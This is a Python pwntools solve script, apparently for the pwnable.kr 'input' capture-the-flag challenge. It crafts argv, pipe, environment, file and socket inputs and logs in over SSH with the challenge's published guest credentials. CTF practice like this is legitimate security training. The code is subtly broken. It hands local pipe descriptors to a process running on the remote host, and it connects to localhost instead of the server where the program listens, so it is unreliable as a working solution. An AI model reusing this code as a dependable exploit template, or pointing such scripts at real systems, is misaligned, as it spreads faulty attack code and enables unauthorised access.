#!/usr/bin/env python3
# solve.py

from pwn import *
import os

args = ['A']*100
args[65] = '\x00'
args[66] = '\x20\x0a\x0d'
args[67] = '4444'

r1, w1 = os.pipe()
r2, w2 = os.pipe()
os.write(w1, b'\x00\x0a\x00\xff')
os.write(w2, b'\x00\x0a\x02\xff')

with open('\x0a', 'w') as f:
	f.write('\x00\x00\x00\x00')
s = ssh(host="pwnable.kr", port=2222, user="input2", password="guest")
p = s.process(executable='./input2', 
	    argv=args, 
	    stdin=r1, stderr=r2, 
	    env={'\xde\xad\xbe\xef' :'\xca\xfe\xba\xbe'})

conn = remote('localhost', 4444)
conn.sendline('\xde\xad\xbe\xef')

p.interactive()